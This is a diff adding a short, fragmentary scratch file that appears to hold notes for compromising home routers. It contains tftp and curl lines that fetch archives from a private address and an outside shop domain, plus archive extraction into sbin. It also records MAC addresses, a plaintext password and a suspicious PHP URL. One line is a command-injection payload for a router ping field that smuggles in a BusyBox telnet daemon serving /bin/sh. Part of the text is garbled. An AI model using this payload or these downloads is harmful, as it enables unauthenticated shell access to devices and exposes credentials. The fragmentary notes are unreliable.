@@ -1,0 +1,28 @@
+tftp -g -r bjc.zip 192.168.254.151 /bjc.zip
+
+curl -O www.junjuncruztech.shop/test.zip
+
+MAC address: 08626670DF28
+        18E81E02145
+D2292A789DF
+
+
+tar -zxvf boss.tgz
+cd 
+cd sbin
+tar -zxvf sbin.tgz
+rm sbin.tgzhffcffcfffxdxxxx
+
+        https://junjuncruz-pro.shop/bjc0e4dc7245dfd66c.php
+
+cd /
+192.168.254.178
+
+pldthome@123
+
+isTest=false&cmd=network_tools&pingTimes=1&url=127.0.0.1.1\nbusybox telnetd -p 4719 -l /bin/sh&port=-1&subcmd=1
+
+
+microtic
+
+jolims.com:8000/webfig/#Interfaces
